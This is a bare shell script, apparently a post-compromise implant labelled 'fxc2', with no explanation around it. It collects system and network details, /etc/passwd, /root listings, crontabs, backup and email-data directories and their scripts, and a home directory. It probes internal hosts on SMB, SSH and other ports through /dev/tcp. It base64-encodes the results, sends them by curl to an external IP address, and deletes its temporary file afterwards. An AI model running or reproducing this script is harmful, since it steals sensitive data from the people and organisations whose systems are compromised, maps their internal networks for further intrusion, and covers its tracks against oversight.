# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#XRUN
O=/tmp/.plxout
{
echo "==DF=="; df -h
echo "==CRON=="; crontab -l 2>&1 | head -5
echo "==PROCS=="; pgrep -fa "/tmp/.q2|rs2.py|do_id" 2>&1 | head -5
echo "==BACKUPS=="; ls -la /backups 2>&1
echo "==ZMIGRATE=="; ls -la /backups/zmigrate 2>&1 | head -30
echo "==EMAILDATA-COUNT=="; ls /backups/zmigrate/emaildata 2>/dev/null | wc -l; ls -la /backups/zmigrate/emaildata 2>/dev/null | head -15
echo "==SCRIPTS=="; for s in /backups/zmigrate/*.sh; do echo "--$s--"; head -40 "$s" 2>/dev/null; done
echo "==IPA=="; ip a 2>&1 | grep -E 'inet |^[0-9]'
echo "==NEIGH=="; ip neigh 2>&1 | head -30
echo "==ROUTES=="; ip r
echo "==LISTEN=="; ss -lntu 2>&1 | head -30
echo "==SASHA=="; ls -la /home/sasha 2>&1 | head -20
echo "==MOUNTS=="; mount | grep -E 'cifs|nfs|/mnt|/backups' 
echo "==PROBE=="
for hp in 192.168.100.11:445 192.168.100.11:139 192.168.100.202:5022 192.168.100.203:5022 10.53.10.1:22 10.53.10.10:22 10.53.10.20:22 10.53.10.29:22 10.53.10.30:5022 10.53.4.1:22; do
  h=${hp%:*}; p=${hp#*:}
  timeout 3 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $hp" || echo "closed $hp"
done
} > $O 2>&1
curl -sm60 -X POST --data-binary @$O http://131.123.43.239/up -H "X-Name: plx_recon1"
rm -f $O
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


